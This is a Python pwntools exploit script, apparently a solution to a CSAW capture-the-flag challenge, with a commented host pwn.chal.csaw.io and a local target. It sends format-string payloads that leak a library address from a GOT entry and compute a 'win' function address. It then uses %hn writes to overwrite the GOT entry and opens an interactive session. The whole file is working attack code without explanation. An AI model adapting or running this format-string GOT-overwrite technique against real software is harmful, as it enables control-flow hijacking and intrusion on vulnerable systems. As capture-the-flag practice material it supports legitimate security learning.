from pwn import *
from struct import *

r = remote('localhost', 5566)
# r = remote('192.168.1.181', 5566)
# r = remote('pwn.chal.csaw.io', 1004)

addrLosePlt    = 0x804a010
offsetLose     = 0x11f8
# offsetWin      = 0x1189
offsetWin      = 0x120c
addrMainFgets  = 0x8048681
addrMainPrintf = 0x804866f

raw_input('>')

payload = ''
payload += pack('<I', addrLosePlt) # Will write 4 Bytes
payload += pack('<I', addrLosePlt + 0x2) # Will write 4 Bytes
payload += '%7$4s' # Leak libmylib lose address
payload += '%2024x' # Write bytes for %n 0x804
payload += '%8$hn' # Cover return address
payload += '%32363x' # Write bytes for %n 0x866f
payload += '%7$hn' # Cover return address
r.sendline(payload)

msg = r.recvuntil(':')
print(msg)
msg = r.recvline()[1:]
print(msg)

index           = 4 + 4
loseArray       = list(reversed([hex(ord(x))[2:] for x in msg[index:index+4]]))
strLose         = ''.join(x for x in loseArray)

addrLose        = int('0x' + strLose, 0)
addrWin         = addrLose - offsetLose + offsetWin
addrWinH        = int('0x' + hex(addrWin)[2:6], 0)
addrWinL        = int('0x' + hex(addrWin)[6:], 0)

print('addrWin : ' + hex(addrWin))

# Now, we can fgets fgets fgets fgets forever

payload2 = ''
payload2 += pack('<I', addrLosePlt) # Will write 4 Bytes
payload2 += pack('<I', addrLosePlt + 0x2) # Will write 4 Bytes
if addrWinH > addrWinL:
    offsetWinHL = addrWinH - addrWinL
    payload2 += ('%' + str(addrWinL - 4 - 4) + 'x')
    payload2 += '%8$hn'
    payload2 += ('%' + str(offsetWinHL) + 'x')
    payload2 += '%9$hn'
else:
    offsetWinHL = addrWinL - addrWinH
    payload2 += ('%' + str(addrWinH - 4 - 4) + 'x')
    payload2 += '%9$hn'
    payload2 += ('%' + str(offsetWinHL) + 'x')
    payload2 += '%8$hn'

r.sendline(payload2)
r.interactive()
